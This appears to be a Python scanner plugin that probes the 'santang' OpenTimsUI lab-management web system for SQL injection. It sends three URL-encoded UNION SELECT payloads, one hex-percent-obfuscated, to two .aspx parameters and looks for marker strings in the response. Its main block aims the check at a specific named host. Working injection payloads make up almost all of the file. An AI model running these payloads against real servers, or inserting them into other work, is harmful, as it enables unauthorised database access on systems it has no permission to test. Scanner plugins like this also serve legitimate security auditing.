#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105992
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105286
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105283
#refer:


def assign(service, arg):
    if service == "santang":
        return True, arg
        
        
def audit(arg): 
    payload = '/OpenTimsUI/AddOpenBook/AddXM_ExpOpCodeidlabtime.aspx?TaskID=-1%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%31%32%29%2b%43%48%41%52%28%31%32%30%29%2b%43%48%41%52%28%31%30%36%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%39%38%29%2b%43%48%41%52%28%31%31%32%29%2b%43%48%41%52%28%31%32%30%29%2b%43%48%41%52%28%31%31%33%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d&type=stu'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if code ==500 and 'qpxjqqbpxq' in res :
        security_hole(arg+'/OpenTimsUI/AddOpenBook/AddXM_ExpOpCodeidlabtime.aspx?TaskID=1'+'  :found sql injection ')
        
        
    payload = '/OpenTimsUI/STUMODEL/StuBookExpCell.aspx?codeID=-1%27%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28120%29%2bCHAR%28106%29%2bCHAR%28113%29%2bCHAR%28113%29%2bCHAR%2898%29%2bCHAR%28112%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%2869%29%2bCHAR%28122%29%2bCHAR%2897%29%2bCHAR%28109%29%2bCHAR%28105%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%2898%29%2bCHAR%28106%29%2bCHAR%28113%29%2CNULL--'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if code ==500 and 'qpxjqqbpxqEzamiqxbjq' in res :
        security_hole(arg+'/OpenTimsUI/STUMODEL/StuBookExpCell.aspx?codeID=1'+'  :found sql injection ')
        
        
    payload = '/OpenTimsUI/AddOpenBook/AddXM_ExpOpCodeidlabtime.aspx?TaskID=-1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2bCHAR%28112%29%2bCHAR%2898%29%2bCHAR%28107%29%2bCHAR%28113%29%2bCHAR%2868%29%2bCHAR%2872%29%2bCHAR%28114%29%2bCHAR%2884%29%2bCHAR%2870%29%2bCHAR%2869%29%2bCHAR%2872%29%2bCHAR%2897%29%2bCHAR%2867%29%2bCHAR%28101%29%2bCHAR%28113%29%2bCHAR%28120%29%2bCHAR%28107%29%2bCHAR%28120%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20%26type%3Dstu'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url)
    if code ==500 and 'qpbkqDHrTFEHaCeqxkxq' in res :
        security_hole(arg+'/OpenTimsUI/AddOpenBook/AddXM_ExpOpCodeidlabtime.aspx?TaskID=1'+'  :found sql injection ')




if __name__ == '__main__':
    from dummy import *
    audit(assign('santang', 'http://www.hnrku.net.cn:8003/')[1])